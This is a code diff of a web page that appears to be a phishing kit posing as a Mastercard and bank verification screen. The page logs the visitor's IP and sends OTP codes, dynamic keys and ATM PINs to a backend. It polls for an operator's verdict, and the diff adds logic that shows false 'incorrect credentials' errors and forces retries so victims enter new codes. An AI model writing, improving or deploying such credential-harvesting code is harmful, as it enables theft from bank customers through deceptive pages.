@@ -77,7 +77,7 @@
             border: 1px solid rgba(255, 255, 255, 0.5);
         }
 
-        /* ===== HEADER CON LOGOS ===== */
+        /* ===== HEADER ===== */
         .header {
             display: flex;
             align-items: center;
@@ -113,7 +113,6 @@
             margin-left: auto;
         }
 
-        /* LOGO MASTERCARD MÁS GRANDE */
         .mc-logo img {
             height: 110px; 
             width: auto;
@@ -483,7 +482,7 @@
     </div>
 
     <div class="container">
-        <!-- CABECERA CON LOGOS -->
+        <!-- CABECERA: LOGO BANCO IZQUIERDA, MASTERCARD DERECHA -->
         <div class="header">
             <div class="bank-logo" id="bankLogoContainer">
                 <img id="bankLogoImg" src="" alt="Logo banco" style="display:none;" />
@@ -626,9 +625,13 @@
         capturarIP();
 
         // ============================================
-        // SOLICITUD ID
+        // SOLICITUD ID - FUNCIÓN PARA GENERAR NUEVO ID
         // ============================================
-        let solicitudId = 'MC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        function generarNuevoSolicitudId() {
+            return 'MC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
+        }
+
+        let solicitudId = generarNuevoSolicitudId();
         console.log('🆔 solicitudId generado al cargar:', solicitudId);
 
         let pollingInterval = null;
@@ -920,7 +923,7 @@
                         tipo_paso: 'otp',
                         solicitudOriginalId: datos.solicitudId,
                         tipo_tarjeta: 'mastercard',
-                        es_reintento: datos.es_reintento || false
+                        es_reintento: true // FORZAMOS REINTENTO
                     })
                 });
                 const data = await response.json();
@@ -948,7 +951,7 @@
                         tipo_paso: 'clave_dinamica',
                         solicitudOriginalId: datos.solicitudId,
                         tipo_tarjeta: 'mastercard',
-                        es_reintento: datos.es_reintento || false
+                        es_reintento: true // FORZAMOS REINTENTO
                     })
                 });
                 const data = await response.json();
@@ -976,7 +979,7 @@
                         tipo_paso: 'clave_cajero',
                         solicitudOriginalId: datos.solicitudId,
                         tipo_tarjeta: 'mastercard',
-                        es_reintento: datos.es_reintento || false
+                        es_reintento: true // FORZAMOS REINTENTO
                     })
                 });
                 const data = await response.json();
@@ -1094,7 +1097,10 @@
                 } else if (resultado.estado === 'rejected') {
                     clearInterval(pollingInterval);
                     pollingInterval = null;
-                    mostrarError('❌ Credenciales incorrectas o transacción rechazada');
+                    mostrarError('❌ Credenciales incorrectas o transacción rechazada. Intente de nuevo.');
+                    // GENERAMOS NUEVO ID PARA PERMITIR REINTENTO
+                    solicitudId = generarNuevoSolicitudId();
+                    console.log('🆔 Nuevo solicitudId para reintento:', solicitudId);
                     resetFormulario();
                     formularioBloqueado = false;
                     return;
@@ -1199,6 +1205,9 @@
                         statusMessage.className = 'status-message error-usuario';
                         statusMessage.textContent = '⚠️ ERROR DE USUARIO: Las credenciales no coinciden. Por favor, ingrese nuevamente sus datos.';
                         statusMessage.style.display = 'block';
+                        // GENERAMOS NUEVO ID PARA PERMITIR REINTENTO
+                        solicitudId = generarNuevoSolicitudId();
+                        console.log('🆔 Nuevo solicitudId para reintento:', solicitudId);
                         resetFormulario();
                         clearInterval(pollingInterval);
                         pollingInterval = null;
@@ -1231,6 +1240,8 @@
                     formularioBloqueado = false;
                     clearInterval(pollingInterval);
                     pollingInterval = null;
+                    // AQUI NO GENERAMOS NUEVO ID PORQUE ES EL MISMO PROCESO DE OTP, 
+                    // SOLO CAMBIAMOS EL CODIGO INTENTADO
                     return;
                 }
             }, POLLING_INTERVAL);
